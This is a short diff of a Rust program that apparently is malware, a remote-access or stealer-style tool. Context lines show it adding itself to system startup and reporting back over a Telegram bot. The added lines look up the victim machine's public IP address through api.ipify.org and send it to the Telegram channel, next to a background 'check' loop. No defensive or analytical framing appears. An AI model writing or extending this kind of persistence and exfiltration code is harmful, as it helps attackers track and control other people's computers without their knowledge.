@@ -130,8 +130,17 @@ async fn main() {
         tokio::spawn(tg::bot_sender(String::from("Added to startup successfully")));
     }
 
+    // ip
+    let l_ip = reqwest::get("https://api.ipify.org?format=json")
+        .await
+        .unwrap()
+        .text()
+        .await
+        .unwrap();
+    tokio::spawn(tg::bot_sender(format!("{}", l_ip)));
+
     // Запускаем `check` в фоне
-    tokio::spawn(async {
+    tokio::spawn(async move {
         loop {
             tg::check(len).await;
         }
